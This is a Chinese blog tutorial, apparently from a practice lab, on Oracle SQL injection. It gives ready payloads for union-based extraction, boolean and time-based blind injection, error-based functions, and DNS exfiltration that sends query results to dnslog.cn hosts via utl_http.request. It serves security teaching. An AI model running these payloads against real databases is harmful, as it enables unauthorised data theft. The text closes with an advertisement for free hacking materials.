# 原创
：  Oracle注入（基础篇）

# Oracle注入（基础篇）

## 先了解Oracle一些内容

## <br/> Oracle做联合注入的注意事项(附带示例)

###### <br/> 联合查询的字段数必须和前面的查询语句字段数一致

```
select id,username,password from admin union select 1,'admin' from dual (X)
```

<br/><br/> 联合查询的字段类型也必须和前面的查询语句字段类型一致

```
select id,username,password from admin union select 1,2,3 from dual (X)
```

<br/><br/> 联合查询的语句中必须要有表名

```
select id,username,password from admin union select 1,'admin','admin' (X)
```

正确的联合查询方法

```
select id,username,password from admin union select 1,'admin','admin' from dual (√)
```

注意:oracle中包裹字符串用’'不要用""

## Oracle自带的表

<br/> select * from all_tables 查询出所有的表

```
关键字段:
OWNER,用户(表的拥有者)，不同的用户下会有不同的表
TABLE_NAME,表名

```

<br/> select * from all_tab_columns 查询出所有的字段

```
关键字段:
OWNER,用户(表的拥有者)，不同的用户下会有不同的表
TABLE_NAME,表名
COLUMN_NAME,字段名
```

下面两个都是查询当前用户的表和字段的，所以没有OWNER字段，另外两个字段是有的

```
select * from user_tables 查询出当前用户的表

select * from user_tab_columns 查询出当前用户的字段
```

其实用的话都用查字段的表就好了，因为查字段的表里面存储了表名和字段

## Oracle怎么实现mysql中Limit的功能

<br/> 在Oracle中有一个比较特殊的存在，它就是rownum，它是一个伪列，它并不存储在任何表中，而是在当我们执行了查询语句之后，它就会出现，对查出来的数据进行编号,将它做为一个判断规则时，它是不支持用&gt;号的,只能是=1或者&lt;n

示例如下

```
SELECT * FROM user WHERE rownum = 1; -- 没问题
SELECT * FROM user WHERE rownum = 2; -- 有问题
SELECT * FROM user WHERE rownum &lt; 2; -- 没问题
SELECT * FROM user WHERE rownum &gt; 2; -- 有问题
```

那如果我们就是想对他用&gt;呢，那么也有办法，用子查询给rownum取个别名,然后外面的查询语句,再使用别名调用rownum的值就好了

例如这里有5条数据我要取后三条数据

```
SELECT * FROM (SELECT rownum rn,DEPT.* FROM DEPT WHERE rownum &lt; 6)r WHERE rn &gt; 
```

<br/> 如何判断是否是oracle数据库<br/> 通过版本号判断,and (select count(*) from v$version) &gt; 0<img alt="" height="324" src="https://img-blog.csdnimg.cn/067b54a12deb4cd89e1562304cfd9983.png" width="1200"/>

通过特有的表判断,and (select count(*) from user_tables) &gt; 0,用dual来进行测试也行<img alt="" height="329" src="https://img-blog.csdnimg.cn/0b5a324df6c54de39c5c527d135f1635.png" width="1200"/>

通过特有的函数判断,and bitand(1,1)=1

## <img alt="" height="309" src="https://img-blog.csdnimg.cn/2dcd3ccebc0f43c181dd7eb5114bb620.png" width="1200"/><br/> 信息收集

<br/> 查询当前用户

```
select user from dual
```

<br/> 查询数据库文件存储位置

```
select name from V$DATAFILE
```

查询数据库版本

```
-- 占个行
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
-- 这个视图需要权限才能查询,所以也可以用它来判断当前用户权限
select version from v$instance
```

<br/> 查询当前用户权限

```
-- 这个可以查询当前用户可以进行哪些操作,例如CREATE SESSION,CREATE PROCEDURE等
select privilege from session_privs
```

<br/><br/> 查询主机IP

```
-- 查询的是内网IP
select utl_inaddr.get_host_address from dual
```

<br/> 查询当前库名,两个都可以用，都可以试一试

```
SELECT global_name FROM global_name;
SELECT SYS.DATABASE_NAME FROM DUAL;
```

<br/> 查询JAVA权限，这个权限是指用户可以调用哪些JAVA类

```
-- 查询所有用户JAVA权限,需要有DBA权限
select * from DBA_JAVA_POLICY;
-- 查看当前用户的JAVA权限
select * from user_java_policy
查看对象( JAVA类(JAVA SOURCE)，存储过程(PROCEDURE),函数(FUNCTION))

-- 查看当前用户创建的对象,常看的就是
select * from user_objects
-- 查看所有用户创建的对象
select * from all_objects
-- 查看已经加载的对象
SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') order by object_id desc;

```

<br/> 查看当前角色权限

```
select granted_role from user_role_privs
```

<br/> 查看指定包源码

```
select TEXT FROM all_source WHERE NAME='包名'
```

#### <br/> 联合注入

> 
<br/> 测字段数 -&gt; 找显错位-&gt; 拿表名 -&gt; 拿字段名 -&gt; 拿数据
再Mysql中可能要查其他数据库的数据，那么再开头还会有一个拿库名的过程，在Oracle中是拿用户名


## 靶场实战

### <br/> 先测试字段数，有两种办法

由于oracle做联合注入需要和前面的联合查询语句字段类型一致，所以我们先用null进行占位，它可以匹配任何类型

oracle的查询语句必须有表名,所以这里写了from dual<img alt="" height="394" src="https://img-blog.csdnimg.cn/caa95062c1ba4759b3de5db5df2b350b.png" width="1200"/>

当字段里面写到4个null时，不报错， 说明是4个字段<img alt="" height="187" src="https://img-blog.csdnimg.cn/ce12afef06914a8caac24470e0bc1d70.png" width="1200"/>

使用order by 关键字进行测试,例如这里，order by 4的时候还是正常的<img alt="" height="105" src="https://img-blog.csdnimg.cn/534ba0694c7f4061a6fd895d1594fccf.png" width="1200"/>

order by 5的时候报错了，说明字段数是4<img alt="" height="337" src="https://img-blog.csdnimg.cn/884048cb83d44bb8a93a0e62deecfd88.png" width="1200"/>

使用联合查询逐一添加字段位数去进行判断,这里有两个注意点

### 找显错位

<br/> 上面我们已经知道了是4个字段，然后就可以先写上4个null进行占位union select null,null,null,null from dual,然后逐个替换数据的类型进行测试，常见的数据类型其实就那么几个(数值，字符串，时间)

这里第一位写的字符’a’,它爆了一个expression must have same datatype as corresponding expression的错误，这表示字段的类型不对，那么就不是字符型了<img alt="" height="122" src="https://img-blog.csdnimg.cn/7a8157dd40624b219dded6de376b93e7.png" width="1200"/>

然后换成1,它没报错，说明第一个字段类型是数值型

<img alt="" height="402" src="https://img-blog.csdnimg.cn/a26f144afd5c4e658c8a82660a51c4e7.png" width="1200"/><br/> 下面测试第二个字段，还是和上面一样，先写字符’a’,这时候注意它的报错，已经和刚才的报错是不一样了，这里的报错是字符集不匹配，那么解决方法就是把我们输入的内容转换为匹配的字符集<img alt="" height="124" src="https://img-blog.csdnimg.cn/13c0dc84c5a24bbfbb94fe3a2a455093.png" width="1092"/>

这里就得提到to_char(),to_nchar()两个函数了,我们可以尝试用这两个函数去对’a’进行转换，哪个没报错，那么就用哪个,这里用的是

```
to_nchar()
union select,to_nchar('a'),null,null from dual
```

<br/> 并且也已经回显了字符a，那么就没必要再测下面的字段类型了，我们用它就好了,如果有字段是时间类型的话可以用to_date()函数，不过我认为如果是时间类型的话，哪怕回显了也利用不了

#### 获取表名

<br/> 利用oracle的user_tab_columns这个自带表进行查询就好了，这里主要的问题在于如何获取其他表名

排除法,将当前的查询到的表名给排除掉就可以获取下一个表名,注意区分大小写<br/> union selec 1,to_nchar(table_name),null,null from user_tab_columns where table_name&lt;&gt;‘ADMIN’<img alt="" height="161" src="https://img-blog.csdnimg.cn/c7658523068e4b4e8de5196c82a0d31c.png" width="1055"/>

有两个办法<br/> 排除法,将当前的查询到的表名给排除掉就可以获取下一个表名,注意区分大小写

```
union selec 1,to_nchar(table_name),null,null from user_tab_columns where table_name&lt;&gt;'ADMIN'
```

<br/> 如果还要查下一个表名那么就在加判断，and table_name &lt;&gt; ‘MD5’,以此类推

2.别名法，再刚开始已经提过了，使用子查询对rownum进行取别名的方式来取数据

<img alt="" height="89" src="https://img-blog.csdnimg.cn/75f31b56b4674ef1a0a7416472aefa68.png" width="1200"/><br/> 上面这种写法，如果排除的表名多了，语句就会很长，还有一种更好的办法,使用not in关键字,只需要把要排除的表名直接写进去就好了

```
union selec 1,to_nchar(table_name),null,null from user_tab_columns where table_name not in('ADMIN','MD5')
```

2.别名法，再刚开始已经提过了，使用子查询对rownum进行取别名的方式来取数据

```
union selec 1,to_nchar(table_name),null,null from user_tab_columns
```

#### 查字段名

<br/> 利用user_tab_columns中的column_name字段就好了,获取其他字段名的方法还是用上面的办法,别忘了限制查哪个表的字段，不然你拿的是谁的字段都不知道

```
union select null,to_nchar(column_name),null,null from user_tab_columns where table_name='ADMIN'

```

<img alt="" height="104" src="https://img-blog.csdnimg.cn/4c3f35cdf61548e3be14acfe485fd840.png" width="1200"/><br/> 查数据

```
union selec 1,to_nchar(UNAME),null,null from ADMIN

```

这里就查刚才获取的UNAME字段的数据吧

### <img alt="" height="99" src="https://img-blog.csdnimg.cn/396300d22cfa4cdeac5929151d121761.png" width="905"/><br/> 布尔注入

### <br/> 字符操作函数

<br/> length(string),返回字符串的长度

instr(源字符,目标字符[,起始位置[,匹配序号]]),这个函数的作用是返回源字符中第一次匹配到目标字符的位置，如果没有的话就返回0，起始位置是设置开始匹配的位置

示例如下

```
-- 我们先查出第一个字符是什么，所以写1=,然后S这个位置就是可以用来枚举字符的位置了，这里面有两个S，但是它只会返回第一个匹配到S的位置
select * from dual where 1=instr('SYSTEM','S')
-- 我们查第二个字符,就改成2=,并且写上第三个参数为2，让他从第2个字符开始查
select * from dual where 2=instr('SYSTEM','Y',2)
-- 第三个，以此类推
select * from dual where 3=instr('SYSTEM','Y',3)
...........
```

## 靶场实战

<br/> 这里就以表名为例，注意我在where后面写了rownum=1,因为查出多条数据会报错的

利用instr()函数做题<br/> 先利用length()，测出表名的长度

```
and length((select table_name from user_tables where rownum=1))=1
```

<img alt="" height="288" src="https://img-blog.csdnimg.cn/a3d55b71a2be4a6baa9ff2f7f7af2d77.png" width="1145"/><br/> 表名长度为5

<img alt="" height="760" src="https://img-blog.csdnimg.cn/0fa2b60b17ea484e852f13e457ffc3de.png" width="976"/><br/> 然后利用instr()获取表名<br/> and 1=instr((select table_name from user_tables where rownum=1),‘a’,1),图片中我没有写1，因为默认就是1开始

<img alt="" height="276" src="https://img-blog.csdnimg.cn/69dc8b6183c8422795e00a90015e5b6a.png" width="1104"/><br/> 跑出来第一个字符是A

<img alt="" height="760" src="https://img-blog.csdnimg.cn/e128a1bdb7c14df5a17337ec9357c68c.png" width="976"/><br/> 跑后面的字符就按instr中说的示例改就好了

decode()+substr()做题<br/> 这个相比使用instr()要写的参数更多，写的时候细心一点

```
-- 匹配成功返回1,1=1就会为真，匹配失败返回0，就会为假
1=decode(substr((select table_name from user_tables where rownum=1),1,1),'a',1,0)
-- 要查询第二个字符的话，将substr的第二个参数改为2就好了，后面的以此类推
1=decode(substr((select table_name from user_tables where rownum=1),2,1),'a',1,0)
-- 爆破的位置为decode的第二个参数，详情见图片中设置的枚举位置
-- 如果想枚举ascii码，可以在substr的外面用ascii()函数进行转换就好了
1=decode(ascii(substr((select table_name from user_tables where rownum=1),2,1)),98,1,0)
```

```
and 1=decode(substr((select table_name from user_tables where rownum=1),1,1),'a',1,0)
```

<br/> 这里跑出来第一个字符是A

### 延时注入<br/> 延时函数

<br/> dbms_pipe.receive_message(‘任意字符’,延迟时间)

<img alt="" height="703" src="https://img-blog.csdnimg.cn/5737da5d1dbb4c10a54981c1168e8ef4.png" width="857"/><br/> (select count() from all_objects),利用查询大量数据来达到一个延时的效果<br/> 执行了(select count() from all_objects)的语句查询结果用时0.555秒

<img alt="" height="732" src="https://img-blog.csdnimg.cn/4e65542fa3844defac71c648ea02b103.png" width="839"/><br/> 而没有执行的查询用时才0.053秒

### <img alt="" height="670" src="https://img-blog.csdnimg.cn/111a34e0597e4ad7bef144a10750c155.png" width="857"/><br/> 报错注入

#### <br/> 报错函数

```
1=utl_inaddr.get_host_name((查询语句))
```

<img alt="" height="202" src="https://img-blog.csdnimg.cn/b2dddc703b694068b42e8ed20ea03225.png" width="732"/><br/> 靶场不支持使用这个函数，所以在数据库里面测试了，可以使用,||符号在oracle中的作用是拼接字符串，我这里往user的左右两边拼接了一个-更方便区分

1=ctxsys.drithsx.sn(1,(查询语句))

<img alt="" height="242" src="https://img-blog.csdnimg.cn/770c2dd871534dd79d8cdeb471aa4d04.png" width="1066"/><br/> (select upper(XMLType(chr(60)||chr(58)||(查询语句)||chr(62))) from dual) is not null

<img alt="" height="307" src="https://img-blog.csdnimg.cn/cefafeb927944c968a40dc39b4fb4160.png" width="918"/><br/> 那几个chr()函数被我用转换后的字符给替换了

(select dbms_xdb_version.checkin((查询语句)) from dual) is not null

<img alt="" height="203" src="https://img-blog.csdnimg.cn/ddb59deadb6a4fbaa16a7c2b551042ed.png" width="1200"/><br/> and (select dbms_xdb_version.makeversioned((查询语句)) from dual) is not null

<img alt="" height="197" src="https://img-blog.csdnimg.cn/233a6fa136904c438cd466b495eace42.png" width="1200"/><br/> and (select dbms_xdb_version.uncheckout((查询语句)) from dual) is not null

<img alt="" height="200" src="https://img-blog.csdnimg.cn/232f9f7f9c3647b08b506f58efe2da6b.png" width="1200"/><br/> and (SELECT dbms_utility.sqlid_to_sqlhash((查询语句)) from dual) is not null

### <img alt="" height="151" src="https://img-blog.csdnimg.cn/6e6eb298bb3e4d32972acaeadb99fefe.png" width="1200"/><br/> 堆叠注入

### <br/> ORACLE不支持堆叠注入

### DNS注入

<br/> select * from dual where (select utl_http.request(查询的字段||’.lcq2u0.dnslog.cn’) from dual) is not null

<img alt="" height="729" src="https://img-blog.csdnimg.cn/174fe7a7a6cd4756abbb9b225e1ccef1.png" width="955"/><br/> and (select utl_inaddr.get_host_address(查询的字段||’.tmpgak.dnslog.cn’) from dual)is not null

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/8f8f65f954954f85926414adc526e5e6.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/5a2450a902e7415892f53373b20240e7.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/82bf884f85984713a9063fbea30b0f86.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/13d3129eae3a423083a0b0b528b0b2ea.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/06f401a62d884e79ae5ca4a1ca05442d.png" width="665"/>

应急响应笔记

学习路线

 
